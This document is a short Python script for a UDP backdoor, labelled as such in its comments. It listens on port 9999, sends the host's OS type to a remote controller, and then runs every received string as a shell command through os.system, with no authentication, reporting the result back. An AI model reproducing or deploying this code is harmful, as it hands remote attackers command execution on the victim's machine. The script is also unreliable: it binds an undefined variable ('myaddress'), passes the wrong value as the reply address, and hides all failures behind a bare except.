import socket,time,os,sys,subprocess

#UDP socket
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

# myaddress without network connection
target_address=("0.0.0.0",9999) # backdoor

try:
    s.bind(myaddress) #binding socket to connect
    #target OS type
    os_type=sys.platform
    data = s.recvfrom(20)
    print(data)
    # sending os details to client / controller
    s.sendto(os_type.encode("ascii"),data[1])
    while True:
        clrdata = s.recvfrom(100) # Receiving data from controller
        # Validating instructions
        cmd=clrdata[0].decode('ascii')
        check=os.system(cmd)
        if check == 0:
            print("Instructions Found.! ")
            s.sendto("Instructions found and executed".encode('ascii'), clrdata)
        else :
            print("Instructions Not Found!! ")
            s.sendto("Instructions not found ".encode('ascii'), clrdata)

except:
    print("socket binding failed")
    time.sleep(1)
    print("Ok check your part")
